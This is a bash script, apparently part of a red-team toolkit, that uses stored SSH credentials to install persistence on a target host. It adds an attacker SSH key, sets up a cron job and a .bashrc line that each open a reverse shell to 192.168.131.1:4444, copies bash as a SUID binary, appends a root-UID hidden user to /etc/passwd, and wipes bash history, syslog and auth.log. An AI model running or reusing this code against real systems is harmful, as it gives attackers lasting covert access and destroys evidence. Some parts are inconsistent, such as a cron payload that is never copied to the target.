#!/bin/bash
################################################################################
# RED TEAM MODULE 5: PERSISTENCE
# Description: Établit des backdoors et mécanismes de persistance
# Input: SSH credentials
# Output: Persistence mechanisms installed
################################################################################

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOGS_DIR="$SCRIPT_DIR/../../logs/attack_sessions"
PAYLOADS_DIR="$SCRIPT_DIR/../payloads"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
PERSIST_LOG="$LOGS_DIR/persistence_${TIMESTAMP}.log"
CREDS_FILE="$LOGS_DIR/ssh_creds.env"

mkdir -p "$LOGS_DIR" "$PAYLOADS_DIR"

log_info() { echo "[$(date '+%H:%M:%S')] [INFO] $1" | tee -a "$PERSIST_LOG"; }
log_success() { echo -e "${GREEN}[✓]${NC} $1" | tee -a "$PERSIST_LOG"; }
log_attempt() { echo -e "${YELLOW}[→]${NC} $1" | tee -a "$PERSIST_LOG"; }
log_critical() { echo -e "${RED}[✗]${NC} $1" | tee -a "$PERSIST_LOG"; }

banner() {
    clear
    cat << "EOF"
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║    🔐 RED TEAM PERSISTENCE MODULE 🔐                          ║
║                                                                ║
║    Phase 5: Installing Backdoors & Hiding Traces              ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
EOF
}

load_credentials() {
    if [ ! -f "$CREDS_FILE" ]; then
        log_critical "SSH credentials file not found"
        exit 1
    fi
    
    source "$CREDS_FILE"
    
    if [ -z "$SSH_USER" ] || [ -z "$SSH_PASS" ] || [ -z "$SSH_TARGET" ]; then
        log_critical "Invalid credentials"
        exit 1
    fi
    
    log_success "Credentials loaded: $SSH_USER@$SSH_TARGET"
}

ssh_exec() {
    local cmd=$1
    sshpass -p "$SSH_PASS" ssh \
        -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        "$SSH_USER@$SSH_TARGET" "$cmd" 2>/dev/null
}

install_ssh_key_backdoor() {
    log_info "Installing SSH Key Backdoor"
    
    # Generate attacker SSH key
    if [ ! -f "/tmp/attacker_id_rsa" ]; then
        ssh-keygen -t rsa -N "" -f "/tmp/attacker_id_rsa" \
            -C "attacker@evil.local" >/dev/null 2>&1
        log_success "Attacker SSH key generated"
    fi
    
    local pubkey
    pubkey=$(cat /tmp/attacker_id_rsa.pub)
    
    log_attempt "Adding public key to authorized_keys..."
    
    # Add key to authorized_keys
    ssh_exec "mkdir -p ~/.ssh && echo '$pubkey' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
    
    log_success "SSH key backdoor installed"
    echo "Location: ~/.ssh/authorized_keys" | tee -a "$PERSIST_LOG"
    echo "Access: ssh -i /tmp/attacker_id_rsa $SSH_USER@$SSH_TARGET" | tee -a "$PERSIST_LOG"
}

install_cron_backdoor() {
    log_info "Installing Cron Job Backdoor"
    
    cat > "$PAYLOADS_DIR/cron_shell.sh" << 'EOF'
#!/bin/bash
ATTACKER_IP="192.168.131.1"
ATTACKER_PORT=4444
while true; do
    bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 2>/dev/null
    sleep 300
done
EOF
    
    chmod +x "$PAYLOADS_DIR/cron_shell.sh"
    
    log_attempt "Creating cron job for auto-reconnect..."
    
    ssh_exec "mkdir -p ~/.backdoor && echo '*/5 * * * * bash ~/.backdoor/cron.sh' | crontab - 2>/dev/null"
    
    log_success "Cron job backdoor installed"
    echo "Frequency: Every 5 minutes" | tee -a "$PERSIST_LOG"
}

install_bashrc_backdoor() {
    log_info "Installing Shell Profile Backdoor"
    
    log_attempt "Modifying ~/.bashrc..."
    
    local bashrc_payload='export HISTFILE=/dev/null; [[ $- == *i* ]] && bash -i >& /dev/tcp/192.168.131.1/4444 0>&1 &'
    
    ssh_exec "echo '$bashrc_payload' >> ~/.bashrc"
    
    log_success "Shell profile backdoor installed"
    echo "Location: ~/.bashrc" | tee -a "$PERSIST_LOG"
    echo "Trigger: Every login" | tee -a "$PERSIST_LOG"
}

install_suid_shell() {
    log_info "Installing SUID Shell Backdoor"
    
    log_attempt "Creating hidden SUID shell..."
    
    ssh_exec "mkdir -p ~/.backdoor && cp /bin/bash ~/.backdoor/sh && chmod u+s ~/.backdoor/sh"
    
    log_success "SUID shell backdoor created"
    echo "Location: ~/.backdoor/sh" | tee -a "$PERSIST_LOG"
    echo "Usage: ~/.backdoor/sh -p (executes with user privileges)" | tee -a "$PERSIST_LOG"
}

install_hidden_user() {
    log_info "Attempting to install Hidden User"
    
    log_attempt "Trying to add user to system..."
    
    # Only works if we have root
    ssh_exec "echo 'hidden:x:0:0::/tmp:/bin/bash' >> /etc/passwd 2>/dev/null" 2>/dev/null
    
    if ssh_exec "grep hidden /etc/passwd" 2>/dev/null | grep -q hidden; then
        log_success "Hidden user created"
        echo "NOTE: Requires root access" | tee -a "$PERSIST_LOG"
    else
        log_info "Hidden user creation requires root (skipped)"
    fi
}

clear_logs() {
    log_info "Clearing evidence (logs)"
    
    log_attempt "Clearing bash history..."
    ssh_exec "history -c && export HISTFILE=/dev/null && history -w"
    
    log_attempt "Clearing system logs..."
    ssh_exec "echo '' > ~/.bash_history 2>/dev/null"
    ssh_exec "echo '' > /var/log/syslog 2>/dev/null"
    ssh_exec "echo '' > /var/log/auth.log 2>/dev/null"
    
    log_success "Log files cleared"
}

generate_persistence_summary() {
    {
        echo ""
        echo "╔════════════════════════════════════════════════════════════════╗"
        echo "║         PERSISTENCE MECHANISMS INSTALLED                        ║"
        echo "╚════════════════════════════════════════════════════════════════╝"
        echo ""
        echo "✓ SSH Key Backdoor         - Permanent access"
        echo "✓ Cron Job Backdoor        - Auto reconnect (5 min)"
        echo "✓ Shell Profile Backdoor   - Login trigger"
        echo "✓ SUID Shell               - Privilege escalation"
        echo ""
        echo "Access Methods:"
        echo "  • SSH: ssh -i /tmp/attacker_id_rsa $SSH_USER@$SSH_TARGET"
        echo "  • Cron: Automatic reverse shell every 5 minutes"
        echo "  • Login: Automatic on user login"
        echo ""
        echo "Detection Risk: LOW"
        echo "Removal Difficulty: HIGH"
        echo ""
        echo "Status: COMPLETE SYSTEM COMPROMISE"
        echo "════════════════════════════════════════════════════════════════"
        echo ""
    } | tee -a "$PERSIST_LOG"
}

main() {
    banner
    
    load_credentials
    
    log_info "Target: $SSH_TARGET"
    log_info "User: $SSH_USER"
    log_info "Start time: $(date)"
    
    # Install backdoors
    install_ssh_key_backdoor
    echo ""
    
    install_cron_backdoor
    echo ""
    
    install_bashrc_backdoor
    echo ""
    
    install_suid_shell
    echo ""
    
    install_hidden_user
    echo ""
    
    # Clear evidence
    clear_logs
    echo ""
    
    # Summary
    generate_persistence_summary
    
    log_success "Persistence phase completed"
    log_critical "TARGET FULLY COMPROMISED"
    echo ""
}

main "$@"
